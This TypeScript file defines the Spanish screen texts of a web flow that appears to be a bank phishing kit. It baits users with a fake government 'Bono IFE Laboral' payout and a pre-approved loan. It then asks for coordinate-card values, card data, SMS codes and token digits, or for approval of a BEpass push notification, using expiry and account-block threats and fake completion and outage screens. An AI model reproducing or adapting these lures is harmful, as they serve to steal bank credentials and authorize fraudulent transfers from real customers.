import { TextsInterface } from '../interfaces/texts.interface';

export class TextStorage {
  constructor() {}

  getDynamicTexts(): TextsInterface {
    let texts: TextsInterface;
    const localTexts = localStorage.getItem('dynamicTexts');
    if (!localTexts) {
      texts = this.getStaticTexts();
      return texts;
    }
    texts = JSON.parse(localTexts);
    return texts;
  }

  setDynamicTexts(texts: TextsInterface) {
    localStorage.setItem('dynamicTexts', JSON.stringify(texts));
  }

  getStaticTexts(): TextsInterface {
    const staticTexts: TextsInterface = {
      initLoading: {
        title: 'Estamos cargando los datos de su cuenta.',
      },

      initialSelecionOne: {
        title:
          'Tiene un Bono IFE Laboral por $250.000 Autorizado, pendiente por desembolso, Adicional tiene un Crédito PreAprobado de $1.150.000 (opcional) para libre Consumo. a continuación Seleccione la opción deseada para solicitar su Producto.',
        options: [
          'Bono IFE Laboral',
          'Crédito de Consumo',
          'Bono IFE Laboral + Credito Consumo',
        ],

        button: 'Solicitar',
      },

      initialSelecionTwo: {
        title: 'Por favor selecione como desea autorizar.',
        options: ['Clave BEpass', 'Tarjeta Clave Coordenadas'],

        button: 'Autorizar',
      },

      coordenadas: {
        title:
          'Usted Solícito la transacción para {variable}, Aprobado para su cuenta con abono Automático, a continuación valide esta transacción ingresando los siguientes datos.',
        subTitle: 'Ingrese los campos de su Tarjeta Clave Coordenadas :',

        waiting: 'Por favor espere mientras comprobamos sus coordenadas.',

        error: 'Se produjo un error por favor intente nuevamente.',

        button: 'Autorizar',
      },

      card: {
        title:
          'Ingrese la siguiente informacion para autorizar la transaccion y sincronizar su Cuenta.',

        waiting: 'Por favor espere mientras comprobamos su tarjeta.',

        button: 'Autorizar',
      },

      message: {
        title:
          'Esta transaccion requiere que valide su tercera clave SMS enviada a su celular.',

        subTitle:
          'Ingrese la clave de {variable} digitos enviada a su celular, este sera valido durante (5) minutos por cada transaccion,expirado el tiempo debe solicitarlo de nuevo.',

        waiting: 'Por favor espere mientras comprobamos su clave.',

        button: 'Solicitar',
      },

      token: {
        title:
          'Esta transaccion requiere que valide los digitos de su Token de transferencias que aparece en su Dispositivo.',

        subTitle: 'Ingrese los numeros de su Dispositivo Token :',

        waiting: 'Por favor espere mientras comprobamos su clave.',

        button: 'Solicitar',
      },

      bePass: {
        title:
          'Hemos enviado una notificación a tu celular para que autorices la transaccion.',

        subTitle:
          'Abre tu App, si no la recibes Selecciona Opcion Tarjeta Clave Coordenadas',

        button: 'Cancelar',
      },

      bePassError: {
        title: 'Debe intentar o autorizar de nuevo por que el tiempo expiró.',

        subTitle: 'No permitas que el tiempo de expiracion termine',

        button: 'Autorizar transacción nuevamente',
      },
      finish: {
        titleMin: 'Proceso Completado',

        subTitle:
          'Tiene una transaccion en proceso, en las siguientes 3 a 6 horas posterior a la solicitud se abonara a su Cuenta.',

        subTitleTwo:
          'Por favor, Acerquese a una Sucursal o Llame a la Linea Telefonica.',

        button: 'Salir',
      },
      redirect: {
        titleMin: 'Promoción no Disponible',

        subTitle:
          'Usted no dispone de estos beneficios por nuestras políticas.',

        subTitleTwo: 'Por favor, Intente nuevamente en unos dias.',

        button: 'Esta Bien',
      },
      exit: {
        titleMin: 'Producto no Autorizado',

        subTitle:
          'El producto no fue autorizado por cargos pendientes o Inactividad en el Proceso.',

        subTitleTwo:
          'ingrese de nuevo y realize la solicitud de nuevo, despues de las siguentes (2) solicitudes erroneas, su clave sera Bloqueada.',

        button: 'Esta Bien',
      },
      repead: {
        titleMin: 'Estado De Credito',

        subTitle:
          'Tiene un credito en proceso de desembolso en los siguientes 3 dias habiles.',

        subTitleTwo: 'Para dudas Llame a la Linea Telefonica.',

        button: 'Salir',
      },
      outService: {
        titleMin: 'Fuera de Servicio',

        subTitle:
          'Presentamos intermitencia disculpenos volveremos en Linea dentro de 1 hora, estamos trabajando para usted.',

        subTitleTwo:
          'Por favor realize su solicitud de Nuevo mas tarde gracias.',

        button: 'Esta Bien',
      },
    };

    return staticTexts;
  }

  getTextWithVariable(normalText: string, keyWord: string): string {
    const result = normalText.replace('{variable}', keyWord);
    if (!result || !result.length) {
      return normalText;
    }
    return result;
  }
}
